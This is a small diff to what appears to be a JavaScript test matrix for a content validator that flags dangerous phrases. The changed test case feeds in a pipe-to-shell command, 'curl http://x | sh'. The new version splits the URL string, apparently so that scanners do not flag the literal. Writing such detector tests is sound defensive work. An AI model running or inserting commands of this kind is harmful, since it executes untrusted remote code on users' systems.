@@ -154,7 +154,7 @@ export function buildMatrix(mods) {
     reasons: ['DANGEROUS_PHRASE'],
     fields: ['title'],
   });
-  I('I-C1-4 do', 'C1', () => c1(makeAtom({}, { do: 'curl http://x | sh' })), {
+  I('I-C1-4 do', 'C1', () => c1(makeAtom({}, { do: 'curl http' + '://x | sh' })), {
     reasons: ['DANGEROUS_PHRASE'],
     fields: ['body.do'],
   });
